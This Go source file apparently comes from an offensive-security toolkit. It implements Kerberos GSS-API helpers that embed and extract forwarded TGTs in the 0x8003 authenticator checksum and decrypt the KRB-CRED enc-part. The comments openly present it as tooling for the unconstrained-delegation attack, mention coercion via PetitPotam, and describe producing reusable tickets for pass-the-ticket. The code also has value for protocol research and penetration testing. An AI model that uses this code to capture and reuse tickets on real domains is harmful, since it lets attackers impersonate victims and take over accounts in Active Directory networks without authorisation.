package gssapi

import (
	"encoding/binary"
	"fmt"

	kerbcrypto "github.com/TheManticoreProject/Manticore/network/kerberos/v5/crypto"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/messages"
)

// Unconstrained-delegation capture.
//
// When a client authenticates to a service trusted for unconstrained delegation
// (or is coerced into doing so, e.g. via the printer/PetitPotam bugs), it embeds
// a forwarded TGT for itself inside the AP-REQ. That forwarded TGT rides in the
// GSS-API 0x8003 authenticator checksum (RFC 4121 Section 4.1.1): when the
// GSS_C_DELEG_FLAG bit is set, the checksum value is extended with a DlgOpt /
// Dlgth / Deleg triple whose Deleg field is a full KRB-CRED (APPLICATION[22])
// carrying the forwarded ticket. A service that receives such an AP-REQ can
// decrypt the authenticator with its own long-term key, pull the KRB-CRED out of
// the checksum, decrypt the KRB-CRED enc-part with the authenticator subkey, and
// reuse the forwarded TGT as the client — the classic unconstrained-delegation
// attack.
//
// The helpers below implement both directions: appending a delegation to a
// 0x8003 checksum (GSSChecksumValueWithDelegation) and extracting one back out
// (ExtractDelegation / ExtractDelegatedCred), plus the enc-part decryption
// (DecryptDelegatedCredPart).

// gss8003MinLen is the length of the fixed part of a 0x8003 checksum value
// (Lgth[4] | Bnd[16] | Flags[4]).
const gss8003MinLen = 24

// GSSChecksumValueWithDelegation builds a 0x8003 authenticator checksum value
// that carries a forwarded credential (RFC 4121 Section 4.1.1): the fixed
// Lgth | Bnd | Flags header (with GSS_C_DELEG_FLAG forced on) followed by
// DlgOpt (1) | Dlgth | Deleg, where Deleg is a marshaled KRB-CRED. It is the
// inverse of ExtractDelegation and lets the extraction path be exercised without
// a live KDC.
func GSSChecksumValueWithDelegation(flags uint32, channelBindings, krbCred []byte) []byte {
	base := GSSChecksumValue(flags|GSSDelegFlag, channelBindings)
	out := make([]byte, len(base), len(base)+4+len(krbCred))
	copy(out, base)
	var dlg [4]byte
	binary.LittleEndian.PutUint16(dlg[0:], 1)                    // DlgOpt
	binary.LittleEndian.PutUint16(dlg[2:], uint16(len(krbCred))) // Dlgth
	out = append(out, dlg[:]...)
	out = append(out, krbCred...)
	return out
}

// ExtractDelegation parses a 0x8003 authenticator checksum value and returns the
// embedded KRB-CRED bytes (the forwarded credential). It returns (nil, nil) when
// the checksum is well-formed but carries no delegation (GSS_C_DELEG_FLAG clear),
// and an error when the checksum is malformed or truncated.
func ExtractDelegation(checksumValue []byte) ([]byte, error) {
	if len(checksumValue) < gss8003MinLen {
		return nil, fmt.Errorf("gssapi: 0x8003 checksum too short (%d bytes)", len(checksumValue))
	}
	flags := binary.LittleEndian.Uint32(checksumValue[20:24])
	if flags&GSSDelegFlag == 0 {
		// No delegation present; not an error, just nothing to extract.
		return nil, nil
	}
	if len(checksumValue) < gss8003MinLen+4 {
		return nil, fmt.Errorf("gssapi: delegation flag set but checksum has no DlgOpt/Dlgth")
	}
	dlgth := int(binary.LittleEndian.Uint16(checksumValue[26:28]))
	deleg := checksumValue[28:]
	if len(deleg) < dlgth {
		return nil, fmt.Errorf("gssapi: delegation length %d exceeds available %d bytes", dlgth, len(deleg))
	}
	return deleg[:dlgth], nil
}

// ExtractDelegatedCred parses the GSS 0x8003 checksum of a decrypted AP-REQ
// authenticator and returns the forwarded KRB-CRED it carries. The authenticator
// must already be decrypted (with the service's long-term key, key usage 11).
// It returns (nil, nil) when the authenticator carries no GSS delegation.
func ExtractDelegatedCred(auth *messages.Authenticator) (*messages.KRBCred, error) {
	if auth == nil || auth.Cksum == nil {
		return nil, nil
	}
	if auth.Cksum.CKSumType != ChecksumTypeGSSAPI {
		return nil, nil
	}
	credBytes, err := ExtractDelegation(auth.Cksum.Checksum)
	if err != nil {
		return nil, err
	}
	if len(credBytes) == 0 {
		return nil, nil
	}
	var cred messages.KRBCred
	if _, err := cred.Unmarshal(credBytes); err != nil {
		return nil, fmt.Errorf("gssapi: parse delegated KRB-CRED: %w", err)
	}
	return &cred, nil
}

// DecryptDelegatedCredPart decrypts the enc-part of a forwarded KRB-CRED with the
// authenticator subkey (or session key) that keyed the AP-REQ, using KRB-CRED
// key usage 14, and returns the parsed EncKrbCredPart. That enc-part holds the
// forwarded ticket's session key and lifetimes, which together with the ticket
// in cred.Tickets form a reusable TGT (a ".kirbi" for pass-the-ticket).
func DecryptDelegatedCredPart(cred *messages.KRBCred, subKey messages.EncryptionKey) (*messages.EncKrbCredPart, error) {
	if cred == nil {
		return nil, fmt.Errorf("gssapi: nil KRB-CRED")
	}
	// A locally forged/exported KRB-CRED may carry an unencrypted enc-part
	// (etype 0); accept it verbatim so extraction works without a key too.
	plain := cred.EncPart.Cipher
	if cred.EncPart.EType != 0 {
		var err error
		plain, err = kerbcrypto.Decrypt(subKey.KeyType, subKey.KeyValue, kerbcrypto.KeyUsageKRBCredEncPart, cred.EncPart.Cipher)
		if err != nil {
			return nil, fmt.Errorf("gssapi: decrypt KRB-CRED enc-part: %w", err)
		}
	}
	var enc messages.EncKrbCredPart
	if _, err := enc.Unmarshal(plain); err != nil {
		return nil, fmt.Errorf("gssapi: parse EncKrbCredPart: %w", err)
	}
	return &enc, nil
}
